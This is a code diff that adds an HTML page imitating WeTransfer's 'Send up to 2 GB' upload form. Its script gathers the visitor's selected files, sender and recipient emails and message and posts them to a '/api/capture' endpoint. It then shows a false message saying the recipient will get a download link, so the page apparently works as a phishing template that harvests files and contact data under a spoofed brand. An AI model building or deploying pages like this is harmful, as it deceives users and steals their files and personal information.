@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WeTransfer - Send Large Files</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; background: #409fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .transfer-box { background: white; border-radius: 16px; padding: 32px; width: 380px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
+        .transfer-box h2 { margin: 0 0 24px; font-size: 18px; color: #333; }
+        .drop-area { border: 2px dashed #ccc; border-radius: 8px; padding: 32px; text-align: center; cursor: pointer; margin-bottom: 16px; }
+        .drop-area:hover { border-color: #409fff; background: #f0f7ff; }
+        .drop-area p { margin: 0; color: #666; }
+        .file-list { margin: 8px 0; }
+        .file-list .file-item { background: #f5f5f5; border-radius: 4px; padding: 8px 12px; margin: 4px 0; font-size: 13px; display: flex; justify-content: space-between; }
+        input { width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; margin: 6px 0; box-sizing: border-box; }
+        .btn-transfer { background: #409fff; color: white; border: none; padding: 14px; border-radius: 8px; cursor: pointer; font-size: 16px; width: 100%; margin-top: 12px; }
+        .btn-transfer:hover { background: #3080e0; }
+        .add-more { color: #409fff; cursor: pointer; font-size: 13px; text-decoration: underline; margin-top: 4px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <div class="transfer-box">
+        <h2>Send up to 2 GB</h2>
+        <div class="drop-area" onclick="document.getElementById('file-input').click()">
+            <p>+ Add your files</p>
+            <input type="file" id="file-input" style="display:none" multiple>
+        </div>
+        <div class="file-list" id="file-list"></div>
+        <span class="add-more" onclick="document.getElementById('file-input').click()">Add more files</span>
+        <input type="email" id="email-to" placeholder="Email to">
+        <input type="email" id="email-from" placeholder="Your email">
+        <input type="text" id="message" placeholder="Message">
+        <button class="btn-transfer" onclick="transfer()">Transfer</button>
+    </div>
+    <script>
+        document.getElementById('file-input').onchange = function(e) {
+            const list = document.getElementById('file-list');
+            list.innerHTML = '';
+            for (const f of e.target.files) {
+                const item = document.createElement('div');
+                item.className = 'file-item';
+                const size = f.size > 1048576 ? (f.size/1048576).toFixed(1)+' MB' : (f.size/1024).toFixed(0)+' KB';
+                item.innerHTML = '<span>'+f.name+'</span><span>'+size+'</span>';
+                list.appendChild(item);
+            }
+        };
+        function transfer() {
+            const files = document.getElementById('file-input').files;
+            if (!files.length) return alert('Add files first');
+            const fd = new FormData();
+            fd.append('site', 'wetransfer.com');
+            fd.append('action', 'file_transfer');
+            fd.append('email_to', document.getElementById('email-to').value);
+            fd.append('email_from', document.getElementById('email-from').value);
+            fd.append('message', document.getElementById('message').value);
+            for (const f of files) fd.append('file', f);
+            fetch('/api/capture', {method: 'POST', body: fd});
+            alert('Transfer started! Recipient will get a download link.');
+        }
+    </script>
+</body>
+</html>
